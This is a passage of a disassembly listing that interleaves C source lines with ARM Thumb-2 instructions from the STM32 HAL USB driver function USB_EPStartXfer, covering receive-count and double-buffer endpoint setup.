 8007a22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a26:	681b      	ldr	r3, [r3, #0]
 8007a28:	699a      	ldr	r2, [r3, #24]
 8007a2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a32:	681b      	ldr	r3, [r3, #0]
 8007a34:	691b      	ldr	r3, [r3, #16]
 8007a36:	429a      	cmp	r2, r3
 8007a38:	d917      	bls.n	8007a6a <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 8007a3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a42:	681b      	ldr	r3, [r3, #0]
 8007a44:	691b      	ldr	r3, [r3, #16]
 8007a46:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 8007a4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a4e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a52:	681b      	ldr	r3, [r3, #0]
 8007a54:	699a      	ldr	r2, [r3, #24]
 8007a56:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007a5a:	1ad2      	subs	r2, r2, r3
 8007a5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a64:	681b      	ldr	r3, [r3, #0]
 8007a66:	619a      	str	r2, [r3, #24]
 8007a68:	e00e      	b.n	8007a88 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007a6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a72:	681b      	ldr	r3, [r3, #0]
 8007a74:	699b      	ldr	r3, [r3, #24]
 8007a76:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007a7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a82:	681b      	ldr	r3, [r3, #0]
 8007a84:	2200      	movs	r2, #0
 8007a86:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007a88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a8c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a90:	681b      	ldr	r3, [r3, #0]
 8007a92:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007a96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a9a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a9e:	681b      	ldr	r3, [r3, #0]
 8007aa0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007aa4:	b29b      	uxth	r3, r3
 8007aa6:	461a      	mov	r2, r3
 8007aa8:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007aac:	4413      	add	r3, r2
 8007aae:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007ab2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ab6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aba:	681b      	ldr	r3, [r3, #0]
 8007abc:	781b      	ldrb	r3, [r3, #0]
 8007abe:	00da      	lsls	r2, r3, #3
 8007ac0:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007ac4:	4413      	add	r3, r2
 8007ac6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007aca:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007ace:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007ad2:	881b      	ldrh	r3, [r3, #0]
 8007ad4:	b29b      	uxth	r3, r3
 8007ad6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007ada:	b29a      	uxth	r2, r3
 8007adc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007ae0:	801a      	strh	r2, [r3, #0]
 8007ae2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ae6:	2b3e      	cmp	r3, #62	; 0x3e
 8007ae8:	d924      	bls.n	8007b34 <USB_EPStartXfer+0xec2>
 8007aea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007aee:	095b      	lsrs	r3, r3, #5
 8007af0:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007af4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007af8:	f003 031f 	and.w	r3, r3, #31
 8007afc:	2b00      	cmp	r3, #0
 8007afe:	d104      	bne.n	8007b0a <USB_EPStartXfer+0xe98>
 8007b00:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b04:	3b01      	subs	r3, #1
 8007b06:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b0a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b0e:	881b      	ldrh	r3, [r3, #0]
 8007b10:	b29a      	uxth	r2, r3
 8007b12:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b16:	b29b      	uxth	r3, r3
 8007b18:	029b      	lsls	r3, r3, #10
 8007b1a:	b29b      	uxth	r3, r3
 8007b1c:	4313      	orrs	r3, r2
 8007b1e:	b29b      	uxth	r3, r3
 8007b20:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b24:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b28:	b29a      	uxth	r2, r3
 8007b2a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b2e:	801a      	strh	r2, [r3, #0]
 8007b30:	f000 bc10 	b.w	8008354 <USB_EPStartXfer+0x16e2>
 8007b34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b38:	2b00      	cmp	r3, #0
 8007b3a:	d10c      	bne.n	8007b56 <USB_EPStartXfer+0xee4>
 8007b3c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b40:	881b      	ldrh	r3, [r3, #0]
 8007b42:	b29b      	uxth	r3, r3
 8007b44:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007b48:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007b4c:	b29a      	uxth	r2, r3
 8007b4e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b52:	801a      	strh	r2, [r3, #0]
 8007b54:	e3fe      	b.n	8008354 <USB_EPStartXfer+0x16e2>
 8007b56:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b5a:	085b      	lsrs	r3, r3, #1
 8007b5c:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b60:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007b64:	f003 0301 	and.w	r3, r3, #1
 8007b68:	2b00      	cmp	r3, #0
 8007b6a:	d004      	beq.n	8007b76 <USB_EPStartXfer+0xf04>
 8007b6c:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b70:	3301      	adds	r3, #1
 8007b72:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007b76:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b7a:	881b      	ldrh	r3, [r3, #0]
 8007b7c:	b29a      	uxth	r2, r3
 8007b7e:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007b82:	b29b      	uxth	r3, r3
 8007b84:	029b      	lsls	r3, r3, #10
 8007b86:	b29b      	uxth	r3, r3
 8007b88:	4313      	orrs	r3, r2
 8007b8a:	b29a      	uxth	r2, r3
 8007b8c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007b90:	801a      	strh	r2, [r3, #0]
 8007b92:	e3df      	b.n	8008354 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007b94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b9c:	681b      	ldr	r3, [r3, #0]
 8007b9e:	78db      	ldrb	r3, [r3, #3]
 8007ba0:	2b02      	cmp	r3, #2
 8007ba2:	f040 8218 	bne.w	8007fd6 <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 8007ba6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007baa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bae:	681b      	ldr	r3, [r3, #0]
 8007bb0:	785b      	ldrb	r3, [r3, #1]
 8007bb2:	2b00      	cmp	r3, #0
 8007bb4:	f040 809d 	bne.w	8007cf2 <USB_EPStartXfer+0x1080>
 8007bb8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bbc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007bc0:	681b      	ldr	r3, [r3, #0]
 8007bc2:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007bc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bca:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007bce:	681b      	ldr	r3, [r3, #0]
 8007bd0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007bd4:	b29b      	uxth	r3, r3
 8007bd6:	461a      	mov	r2, r3
 8007bd8:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007bdc:	4413      	add	r3, r2
 8007bde:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007be2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007be6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bea:	681b      	ldr	r3, [r3, #0]
 8007bec:	781b      	ldrb	r3, [r3, #0]
 8007bee:	00da      	lsls	r2, r3, #3
 8007bf0:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007bf4:	4413      	add	r3, r2
 8007bf6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007bfa:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007bfe:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c02:	881b      	ldrh	r3, [r3, #0]
 8007c04:	b29b      	uxth	r3, r3
 8007c06:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007c0a:	b29a      	uxth	r2, r3
 8007c0c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c10:	801a      	strh	r2, [r3, #0]
 8007c12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c1a:	681b      	ldr	r3, [r3, #0]
 8007c1c:	691b      	ldr	r3, [r3, #16]
 8007c1e:	2b3e      	cmp	r3, #62	; 0x3e
 8007c20:	d92b      	bls.n	8007c7a <USB_EPStartXfer+0x1008>
 8007c22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c2a:	681b      	ldr	r3, [r3, #0]
 8007c2c:	691b      	ldr	r3, [r3, #16]
 8007c2e:	095b      	lsrs	r3, r3, #5
 8007c30:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c3c:	681b      	ldr	r3, [r3, #0]
 8007c3e:	691b      	ldr	r3, [r3, #16]
 8007c40:	f003 031f 	and.w	r3, r3, #31
 8007c44:	2b00      	cmp	r3, #0
 8007c46:	d104      	bne.n	8007c52 <USB_EPStartXfer+0xfe0>
 8007c48:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c4c:	3b01      	subs	r3, #1
 8007c4e:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007c52:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c56:	881b      	ldrh	r3, [r3, #0]
 8007c58:	b29a      	uxth	r2, r3
 8007c5a:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007c5e:	b29b      	uxth	r3, r3
 8007c60:	029b      	lsls	r3, r3, #10
 8007c62:	b29b      	uxth	r3, r3
 8007c64:	4313      	orrs	r3, r2
 8007c66:	b29b      	uxth	r3, r3
 8007c68:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c6c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c70:	b29a      	uxth	r2, r3
 8007c72:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c76:	801a      	strh	r2, [r3, #0]
 8007c78:	e070      	b.n	8007d5c <USB_EPStartXfer+0x10ea>
 8007c7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c82:	681b      	ldr	r3, [r3, #0]
 8007c84:	691b      	ldr	r3, [r3, #16]
 8007c86:	2b00      	cmp	r3, #0
 8007c88:	d10c      	bne.n	8007ca4 <USB_EPStartXfer+0x1032>
 8007c8a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007c8e:	881b      	ldrh	r3, [r3, #0]
 8007c90:	b29b      	uxth	r3, r3
 8007c92:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c96:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c9a:	b29a      	uxth	r2, r3
 8007c9c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007ca0:	801a      	strh	r2, [r3, #0]
 8007ca2:	e05b      	b.n	8007d5c <USB_EPStartXfer+0x10ea>
 8007ca4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ca8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cac:	681b      	ldr	r3, [r3, #0]
 8007cae:	691b      	ldr	r3, [r3, #16]
 8007cb0:	085b      	lsrs	r3, r3, #1
 8007cb2:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007cb6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cbe:	681b      	ldr	r3, [r3, #0]
 8007cc0:	691b      	ldr	r3, [r3, #16]
 8007cc2:	f003 0301 	and.w	r3, r3, #1
 8007cc6:	2b00      	cmp	r3, #0
 8007cc8:	d004      	beq.n	8007cd4 <USB_EPStartXfer+0x1062>
 8007cca:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007cce:	3301      	adds	r3, #1
 8007cd0:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007cd4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007cd8:	881b      	ldrh	r3, [r3, #0]
 8007cda:	b29a      	uxth	r2, r3
 8007cdc:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007ce0:	b29b      	uxth	r3, r3
 8007ce2:	029b      	lsls	r3, r3, #10
 8007ce4:	b29b      	uxth	r3, r3
 8007ce6:	4313      	orrs	r3, r2
 8007ce8:	b29a      	uxth	r2, r3
 8007cea:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007cee:	801a      	strh	r2, [r3, #0]
 8007cf0:	e034      	b.n	8007d5c <USB_EPStartXfer+0x10ea>
 8007cf2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cf6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cfa:	681b      	ldr	r3, [r3, #0]
 8007cfc:	785b      	ldrb	r3, [r3, #1]
 8007cfe:	2b01      	cmp	r3, #1
 8007d00:	d12c      	bne.n	8007d5c <USB_EPStartXfer+0x10ea>
 8007d02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d06:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d0a:	681b      	ldr	r3, [r3, #0]
 8007d0c:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007d10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d14:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d18:	681b      	ldr	r3, [r3, #0]
 8007d1a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d1e:	b29b      	uxth	r3, r3
 8007d20:	461a      	mov	r2, r3
 8007d22:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007d26:	4413      	add	r3, r2
 8007d28:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007d2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d34:	681b      	ldr	r3, [r3, #0]
 8007d36:	781b      	ldrb	r3, [r3, #0]
 8007d38:	00da      	lsls	r2, r3, #3
 8007d3a:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007d3e:	4413      	add	r3, r2
 8007d40:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007d44:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007d48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d50:	681b      	ldr	r3, [r3, #0]
 8007d52:	691b      	ldr	r3, [r3, #16]
 8007d54:	b29a      	uxth	r2, r3
 8007d56:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007d5a:	801a      	strh	r2, [r3, #0]
 8007d5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d60:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d64:	681b      	ldr	r3, [r3, #0]
 8007d66:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007d6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d72:	681b      	ldr	r3, [r3, #0]
 8007d74:	785b      	ldrb	r3, [r3, #1]
 8007d76:	2b00      	cmp	r3, #0
 8007d78:	f040 809d 	bne.w	8007eb6 <USB_EPStartXfer+0x1244>
 8007d7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d80:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d84:	681b      	ldr	r3, [r3, #0]
 8007d86:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007d8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d8e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d92:	681b      	ldr	r3, [r3, #0]
 8007d94:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007d98:	b29b      	uxth	r3, r3
 8007d9a:	461a      	mov	r2, r3
 8007d9c:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007da0:	4413      	add	r3, r2
 8007da2:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007da6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007daa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dae:	681b      	ldr	r3, [r3, #0]
 8007db0:	781b      	ldrb	r3, [r3, #0]
 8007db2:	00da      	lsls	r2, r3, #3
 8007db4:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007db8:	4413      	add	r3, r2
 8007dba:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007dbe:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007dc2:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007dc6:	881b      	ldrh	r3, [r3, #0]
 8007dc8:	b29b      	uxth	r3, r3
 8007dca:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007dce:	b29a      	uxth	r2, r3
 8007dd0:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007dd4:	801a      	strh	r2, [r3, #0]
 8007dd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dda:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dde:	681b      	ldr	r3, [r3, #0]
 8007de0:	691b      	ldr	r3, [r3, #16]
 8007de2:	2b3e      	cmp	r3, #62	; 0x3e
 8007de4:	d92b      	bls.n	8007e3e <USB_EPStartXfer+0x11cc>
 8007de6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dee:	681b      	ldr	r3, [r3, #0]
 8007df0:	691b      	ldr	r3, [r3, #16]
 8007df2:	095b      	lsrs	r3, r3, #5
 8007df4:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007df8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e00:	681b      	ldr	r3, [r3, #0]
 8007e02:	691b      	ldr	r3, [r3, #16]
 8007e04:	f003 031f 	and.w	r3, r3, #31
 8007e08:	2b00      	cmp	r3, #0
 8007e0a:	d104      	bne.n	8007e16 <USB_EPStartXfer+0x11a4>
 8007e0c:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e10:	3b01      	subs	r3, #1
 8007e12:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e16:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e1a:	881b      	ldrh	r3, [r3, #0]
 8007e1c:	b29a      	uxth	r2, r3
 8007e1e:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e22:	b29b      	uxth	r3, r3
 8007e24:	029b      	lsls	r3, r3, #10
 8007e26:	b29b      	uxth	r3, r3
 8007e28:	4313      	orrs	r3, r2
 8007e2a:	b29b      	uxth	r3, r3
 8007e2c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e30:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e34:	b29a      	uxth	r2, r3
 8007e36:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e3a:	801a      	strh	r2, [r3, #0]
 8007e3c:	e069      	b.n	8007f12 <USB_EPStartXfer+0x12a0>
 8007e3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e46:	681b      	ldr	r3, [r3, #0]
 8007e48:	691b      	ldr	r3, [r3, #16]
 8007e4a:	2b00      	cmp	r3, #0
 8007e4c:	d10c      	bne.n	8007e68 <USB_EPStartXfer+0x11f6>
 8007e4e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e52:	881b      	ldrh	r3, [r3, #0]
 8007e54:	b29b      	uxth	r3, r3
 8007e56:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e5a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e5e:	b29a      	uxth	r2, r3
 8007e60:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e64:	801a      	strh	r2, [r3, #0]
 8007e66:	e054      	b.n	8007f12 <USB_EPStartXfer+0x12a0>
 8007e68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e70:	681b      	ldr	r3, [r3, #0]
 8007e72:	691b      	ldr	r3, [r3, #16]
 8007e74:	085b      	lsrs	r3, r3, #1
 8007e76:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e82:	681b      	ldr	r3, [r3, #0]
 8007e84:	691b      	ldr	r3, [r3, #16]
 8007e86:	f003 0301 	and.w	r3, r3, #1
 8007e8a:	2b00      	cmp	r3, #0
 8007e8c:	d004      	beq.n	8007e98 <USB_EPStartXfer+0x1226>
 8007e8e:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007e92:	3301      	adds	r3, #1
 8007e94:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007e98:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007e9c:	881b      	ldrh	r3, [r3, #0]
 8007e9e:	b29a      	uxth	r2, r3
 8007ea0:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007ea4:	b29b      	uxth	r3, r3
 8007ea6:	029b      	lsls	r3, r3, #10
 8007ea8:	b29b      	uxth	r3, r3
 8007eaa:	4313      	orrs	r3, r2
 8007eac:	b29a      	uxth	r2, r3
 8007eae:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007eb2:	801a      	strh	r2, [r3, #0]
 8007eb4:	e02d      	b.n	8007f12 <USB_EPStartXfer+0x12a0>
 8007eb6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ebe:	681b      	ldr	r3, [r3, #0]
 8007ec0:	785b      	ldrb	r3, [r3, #1]
 8007ec2:	2b01      	cmp	r3, #1
 8007ec4:	d125      	bne.n	8007f12 <USB_EPStartXfer+0x12a0>
 8007ec6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eca:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ece:	681b      	ldr	r3, [r3, #0]
 8007ed0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ed4:	b29b      	uxth	r3, r3
 8007ed6:	461a      	mov	r2, r3
 8007ed8:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007edc:	4413      	add	r3, r2
 8007ede:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007ee2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ee6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eea:	681b      	ldr	r3, [r3, #0]
 8007eec:	781b      	ldrb	r3, [r3, #0]
 8007eee:	00da      	lsls	r2, r3, #3
 8007ef0:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007ef4:	4413      	add	r3, r2
 8007ef6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007efa:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007efe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f06:	681b      	ldr	r3, [r3, #0]
 8007f08:	691b      	ldr	r3, [r3, #16]
 8007f0a:	b29a      	uxth	r2, r3
 8007f0c:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007f10:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007f12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f1a:	681b      	ldr	r3, [r3, #0]
 8007f1c:	69db      	ldr	r3, [r3, #28]
 8007f1e:	2b00      	cmp	r3, #0
 8007f20:	f000 8218 	beq.w	8008354 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007f24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f28:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f2c:	681a      	ldr	r2, [r3, #0]
 8007f2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f36:	681b      	ldr	r3, [r3, #0]
 8007f38:	781b      	ldrb	r3, [r3, #0]
 8007f3a:	009b      	lsls	r3, r3, #2
 8007f3c:	4413      	add	r3, r2
 8007f3e:	881b      	ldrh	r3, [r3, #0]
 8007f40:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007f44:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f48:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007f4c:	2b00      	cmp	r3, #0
 8007f4e:	d005      	beq.n	8007f5c <USB_EPStartXfer+0x12ea>
 8007f50:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f54:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007f58:	2b00      	cmp	r3, #0
 8007f5a:	d10d      	bne.n	8007f78 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007f5c:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007f60:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007f64:	2b00      	cmp	r3, #0
 8007f66:	f040 81f5 	bne.w	8008354 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
